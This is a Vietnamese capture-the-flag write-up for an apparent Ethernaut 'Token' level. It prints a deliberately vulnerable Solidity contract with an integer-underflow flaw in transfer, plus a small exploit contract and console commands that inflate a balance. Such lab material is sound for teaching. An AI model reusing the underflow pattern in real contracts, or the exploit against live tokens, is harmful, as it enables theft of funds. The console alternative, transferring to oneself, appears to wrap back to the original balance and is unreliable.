# Level 5: Token
## ★★☆☆☆
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
## Phân tích
- Chúng ta được gợi ý về odometer, vậy odometer là gì ?
- Odometer ở đây ý là đồng hồ đo số km trên xe, nếu vượt quá mức limit được cài sẵn thì nó tự reset về 0. -> cho ta gợi ý về overflow
- Chúng ta đều biết về lỗi ``overflow`` là hiện tượng tràn số khi khi tính toán số lớn hơn giá trị max của kiểu dữ liệu đã khao báo. Nhưng trong challenge này ta sẽ gặp ``underflow``, tương tự như ``overflow``, ``underflow`` chỉ là tràn số khi dưới min và được reset trở lại giá trị max .

- Để ý trong function transfer ta có:
```javascript
    require(balances[msg.sender] - _value >= 0);
```
- Ta thấy nếu như balance >= value thì đương nhiên trả về luôn là true, còn nếu như balance < value thì khi balance - value sẽ xảy ra hiện tượng ``underflow``


## Solution
**Target**: làm cho số token trong balance càng lớn càng tốt.  
- Ta kiểm tra balance và thấy có 20 token -> ta cần transfer vào 21 token để trigger hiện tượng ``underflow``

```javascript
await contract.balanceOf(player).then(x => x.toString())
20

```
Một contract đơn giản để tranfer trên remix:
```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.6.3;

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 21);
    }
}
```
hoặc bạn có thể dùng lệnh sau trên console:
```javascript
contract.transfer(player, 21)
```
**Check lại balance** -> Done




